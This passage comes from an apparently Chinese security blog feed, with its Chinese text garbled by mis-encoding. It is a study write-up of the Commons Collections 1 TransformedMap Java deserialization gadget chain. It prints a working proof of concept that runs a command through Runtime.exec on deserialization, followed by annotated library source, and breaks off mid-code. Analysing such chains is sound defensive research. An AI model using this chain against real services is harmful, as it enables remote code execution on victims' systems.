    <category term="life" scheme="http://example.com/categories/life/"/>
    
    
    <category term="life" scheme="http://example.com/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>ysoserialå­¦ä¹ ä¹‹ç•ªå¤– - CommonsCollections1 transformedmapé“¾</title>
    <link href="http://example.com/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/"/>
    <id>http://example.com/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/</id>
    <published>2021-05-19T13:43:06.000Z</published>
    <updated>2021-09-04T11:27:06.525Z</updated>
    
    <content type="html"><![CDATA[<p>çœ‹å®ŒURLDNSä¹‹åå†çœ‹CCé“¾ï¼Œï¼Œè¿™å°¼ç›ç®€ç›´å°±æ˜¯ä¸€ä¸ªå¤©ä¸€ä¸ªåœ°ã€‚ã€‚å‰å‰ååå¤§æ¦‚çœ‹äº†ä¸‰å››å¤©æ‰èƒ½å‹‰å¼ºè¯´æ˜¯ç†è§£äº†ã€‚ç„¶ååˆèŠ±äº†ä¸¤å¤©å¤šæ¥å†™è¿™ç¯‡æ–‡ç« ã€‚ã€‚æˆ‘æ„Ÿè§‰æˆ‘å°½åŠ›äº†ï¼Œï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºæˆ‘çš„æ€ç»´æ–¹å¼è¿˜åœç•™åœ¨phpä¸Šï¼Œæ„Ÿè§‰javaçš„æ–‡ç« çœŸæ˜¯æœ‰ç‚¹éš¾å†™ã€‚ã€‚ã€‚ä¹Ÿè®¸æ˜¯æˆ‘å¤ªæƒ³æŠŠæ¯ä¸ªæµç¨‹è°ƒç”¨éƒ½è´´å‡ºæ¥å§ã€‚ã€‚åé¢æˆ‘ä¼šå­¦ä¹ ä¸‹å¤§ä½¬ä»¬éƒ½æ˜¯æ€ä¹ˆå†™javaæ–‡çš„ã€‚ã€‚è¿™ç¯‡æ–‡ç« å°±å…ˆå°†å°±ç€è¿™æ ·çœ‹å§ï¼Œæˆ‘å°½åŠ›äº†555ã€‚ã€‚ã€‚</p><span id="more"></span><br><p>CommonsCollectionsã€‚ç”¨äºæä¾›æ›´å¥½ç”¨çš„æ•°æ®ç»“æ„ï¼Œæ–¹ä¾¿å¼€å‘å¿«é€Ÿè¿›è¡Œä»£ç å¼€å‘ã€‚</p><p>ç”±äºè¿™ä¸ªé“¾å­ä¸åœ¨ ysoserial ä¸­ï¼Œä½†è¿™ä¸ªç³»åˆ—çš„ä¸»é¢˜ä¸º ysoserialï¼Œäºæ˜¯å°±æŠŠè¿™ä¸ªé“¾å­å½“ä½œç•ªå¤–æ¥å‘½æ ‡é¢˜äº†ã€‚</p><p><strong>ç¯å¢ƒ</strong></p><p>jdk &lt; 8u71</p><p>maven</p><p><strong>Poc:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">transferMapTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;Runtime.class,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = declaredConstructor.newInstance(Retention.class, outerMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–payload</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ååºåˆ—åŒ–ï¼Œè§¦å‘æ¼æ´ç‚¹</span></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        transferMapTest();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»POCä¸­å­¦æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå»æŸ¥<a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html">æ‰‹å†Œ</a>ï¼Œçœ‹çœ‹å¯¹åº”POCä¸­çš„ç±»ã€å‡½æ•°å¤§æ¦‚å¹²ä»€ä¹ˆçš„ï¼Œç„¶åè°ƒè¯•è·Ÿä¸€è·Ÿï¼Œçœ‹çœ‹å˜é‡å’Œå‚æ•°æ˜¯ä½•æ—¶è¢«èµ‹å€¼ï¼Œè¿›è¡Œäº†ä»€ä¹ˆåˆ¤æ–­ï¼Œæ‰§è¡Œäº†ä»€ä¹ˆæ“ä½œã€‚è¿™æ ·åœ¨è„‘æµ·ä¸­ç¼–ç»‡ä¸€ä¸ªå¤§æ¦‚çš„è½®å»“ï¼Œä¹Ÿè®¸èƒ½å¤Ÿæœ‰åŠ©äºæˆ‘ä»¬ç†è§£ä¸€ä¸ªæ¼æ´ã€‚</p><p>ç”±äºè¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–æ´ï¼Œååºåˆ—åŒ–ç±»å‹çš„æ¼æ´çš„POCéƒ½åŒ…å«ä¸¤ä¸ªå¤§å—ï¼š</p><ol><li>gadgets - åˆ©ç”¨é“¾</li><li>readObject() - éœ€è¦èƒ½å¤Ÿè·³åˆ°gadgets</li></ol><br><h1 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h1><p>ä»Pocä¸­æŠ½å‡º gadgets çš„ç›¸å…³ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;Runtime.class,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°çš„CCåº“çš„ç±»æœ‰ï¼šTransformerã€ConstantTransformerã€InvokerTransformerã€ChainedTransformerã€TransformedMapã€‚æŒ¨ä¸ªåˆ†æï¼Œçœ‹Javaå°±å¾—åçš„ä½ã€‚</p><br><h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p><strong>æ‰‹å†Œä¸­å®šä¹‰å¦‚ä¸‹ï¼š</strong></p><p><em><span style="color:#c93434">public interface Transformer</span></em></p><p><em>ç”¨äºå°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡ã€‚é€šå¸¸ç”¨äºå¯¹è±¡è½¬æ¢æˆ–ä»å¯¹è±¡ä¸­è§£ææ•°æ®</em></p><br><p>æŸ¥çœ‹æºç ï¼Œåªæœ‰ä¸€ä¸ªæ–¹æ³• <code>Object transform()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//ç”¨äºå¯¹è¾“å…¥çš„Objectè¿›è¡Œå¤„ç†ï¼Œè¾“å‡ºæ–°çš„Object</span></span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p><strong>æ‰‹å†Œä¸­å®šä¹‰å¦‚ä¸‹ï¼š</strong></p><p><em><span style="color:#c93434">public class ConstantTransformer</span></em></p><p><em><span style="color:#c93434">extends Object</span></em></p><p><em><span style="color:#c93434">implements Transformer, Serializable</span></em></p><p><em>Transformerçš„å®ç°ç±»ï¼Œä»»ä½•æ—¶å€™åªè¿”å›ä¸€ä¸ªç›¸åŒçš„â€œå¸¸é‡â€</em></p><br><p>æŸ¥çœ‹æºç ï¼Œåˆ—å‡ºå’Œæœ¬æ¼æ´ç›¸å…³çš„æ–¹æ³•å’Œå±æ€§ï¼ˆåˆåˆçœ‹çš„æ—¶å€™å¯ä»¥éƒ½å¤§æ¦‚ç„ä¸€ç„ï¼Œè¿™é‡Œä¸ºäº†ç¯‡å¹…å’Œæ¼”ç¤ºçš„åŸå› å°±åªåˆ—å‡ºå’Œæœ¬æ¼æ´ç›¸å…³çš„æ–¹æ³•å’Œå±æ€§äº†ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ç”±äºå…¶å®ç°äº†å‰æ–‡åˆšæåˆ°çš„ Transformeræ¥å£ã€‚</span></span><br><span class="line">    <span class="comment">//å¯ä»¥ç•™æ„ä¸€ä¸‹å…¶é‡å†™çš„transform()æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p><strong>æ‰‹å†Œä¸­å®šä¹‰å¦‚ä¸‹ï¼š</strong></p><p><em><span style="color:#c93434">public class InvokerTransformer</span></em></p><p><em><span style="color:#c93434">extends Object</span></em></p><p><em><span style="color:#c93434">implements Transformer, Serializable</span></em></p><p><em>Transformerçš„å®ç°ç±»ï¼Œé€šè¿‡åå°„åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡</em></p><br><p>æŸ¥çœ‹æºç ï¼Œåˆ—å‡ºå’Œæœ¬æ¼æ´ç›¸å…³çš„æ–¹æ³•å’Œå±æ€§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å®ç°Transformeræ¥å£é‡å†™çš„transform()æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            .....</span><br><span class="line">            <span class="comment">//å¦‚æ–‡æ¡£ä¸­æ‰€è¯´ï¼Œåœ¨è¿™é‡Œè¿›è¡Œäº†åå°„æ“ä½œ</span></span><br><span class="line">            <span class="comment">//åœ¨ååºåˆ—åŒ–ä¸­ï¼Œç±»çš„æˆå‘˜éƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚æ‰€ä»¥è¿™é‡Œçš„å‚æ•°éƒ½æ˜¯å¯æ§çš„</span></span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            .....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p><strong>æ‰‹å†Œä¸­å®šä¹‰å¦‚ä¸‹ï¼š</strong></p><p><span style="color:#c93434"><em>public class ChainedTransformer</em></span></p><p><span style="color:#c93434"><em>extends Object</em></span></p><p><span style="color:#c93434"><em>implements Transformer, Serializable</em></span></p><p><em>Transformerçš„å®ç°ç±»ã€‚å°†æŒ‡å®šçš„ Transformer åƒé“¾å­ä¸€æ ·ä¸²èµ·æ¥ã€‚</em></p><p><em>è¾“å…¥çš„Objectä¼šæŒ‰é¡ºåºè¿›å…¥æŒ‡å®šçš„Transformerï¼Œå¾—åˆ°è¾“å‡ºåå°†ç»“æœå†ä¼ å…¥åˆ°ç¬¬äºŒä¸ªTransformerä¸­ï¼Œä»¥æ­¤ç±»æ¨ã€‚</em></p><p><em>ï¼ˆæœ‰ç‚¹åƒ Linuxçš„ç®¡é“æ“ä½œï¼Œå‰ä¸€ä¸ªè¾“å‡ºä½œä¸ºåä¸€ä¸ªçš„è¾“å…¥ï¼‰</em></p><br><p>æŸ¥çœ‹æºç ï¼Œåˆ—å‡ºå’Œæœ¬æ¼æ´ç›¸å…³çš„æ–¹æ³•å’Œå±æ€§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å®ç°Transformeræ¥å£é‡å†™çš„transform()æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//å¦‚æ–‡æ¡£æ‰€è¯´ï¼Œéå† this.iTransformersï¼Œä¾æ¬¡è°ƒç”¨å¯¹åº”transform()</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            <span class="comment">//æ¯æ¬¡è°ƒç”¨åéƒ½ä¿å­˜è¿”å›å€¼ï¼Œå¹¶ä½œä¸ºä¸‹ä¸€æ¬¡transform()çš„è¾“å…¥</span></span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p><strong>æ‰‹å†Œä¸­å®šä¹‰å¦‚ä¸‹ï¼š</strong></p><p><span style="color:#c93434"><em>public class TransformedMap</em></span></p><p><em><span style="color:#c93434">extends AbstractMapDecorator</span></em></p><p><span style="color:#c93434"><em>implements Serializable</em></span></p><p><em>ä¿®é¥°Mapï¼Œé€šè¿‡Transformerè½¬æ¢æˆå¯¹åº”ç±»å‹ã€‚</em></p><p><em>TransformedMapçš„çˆ¶ç±»AbstractMapDecoratorå®ç°äº†Mapæ¥å£ã€‚</em></p><p><em>TransformedMapé‡å†™äº†Map put()æ–¹æ³•ï¼ŒTransformedMapçˆ¶ç±»AbstractInputCheckedMapDecoratoré‡å†™äº†Map.MapEntry setValue()æ–¹æ³•</em></p><br><p>æŸ¥çœ‹æºç ï¼Œåˆ—å‡ºå’Œæœ¬æ¼æ´ç›¸å…³çš„æ–¹æ³•å’Œå±æ€§ï¼ˆä¸å®Œå…¨ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = <span class="keyword">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">=============================================</span><br><span class="line"><span class="keyword">package</span> org.apache.commons.collections.map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å·¥å‚æ–¹æ³•ï¼Œè¿”å›TransformedMapç±»å®ä¾‹</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span 